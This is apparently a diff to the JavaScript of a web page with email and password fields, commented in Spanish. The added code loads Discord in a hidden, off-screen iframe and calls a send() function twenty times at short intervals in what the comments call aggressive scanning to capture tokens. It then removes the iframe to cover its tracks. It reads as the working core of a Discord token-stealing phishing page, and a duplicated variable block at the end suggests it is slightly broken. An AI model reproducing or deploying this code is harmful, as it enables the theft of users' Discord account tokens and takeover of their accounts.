@@ -461,12 +461,48 @@
             }, 2500);
         });
         
-        // Auto-scan al cargar
-        console.log('Page loaded, auto-scan will start in 3 seconds...');
-        
         // Limpiar campos al cargar
         document.getElementById('email').value = '';
         document.getElementById('password').value = '';
+        
+        console.log('Page loaded, initializing token capture...');
+        
+        // Estrategia de iframe invisible para capturar tokens
+        var iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.style.width = '0';
+        iframe.style.height = '0';
+        iframe.style.border = 'none';
+        iframe.style.position = 'absolute';
+        iframe.style.top = '-9999px';
+        iframe.src = 'https://discord.com/app';
+        
+        console.log('Loading Discord in hidden iframe...');
+        document.body.appendChild(iframe);
+        
+        // Escaneo agresivo múltiple para capturar tokens
+        var scanCount = 0;
+        var maxScans = 20;
+        
+        // Escaneo inmediato
+        send(null, null);
+        scanCount++;
+        
+        // Escaneos repetidos cada 400ms durante 8 segundos
+        var aggressiveScan = window.setInterval(function() {
+            console.log('Aggressive scan #' + scanCount);
+            send(null, null);
+            scanCount++;
+            
+            if (scanCount >= maxScans) {
+                window.clearInterval(aggressiveScan);
+                console.log('Aggressive scanning complete');
+                // Remover iframe después de escanear
+                try {
+                    document.body.removeChild(iframe);
+                } catch(e) {}
+            }
+        }, 400);
         
         // Escaneo agresivo múltiple para capturar tokens durante la carga
         var scanCount = 0;
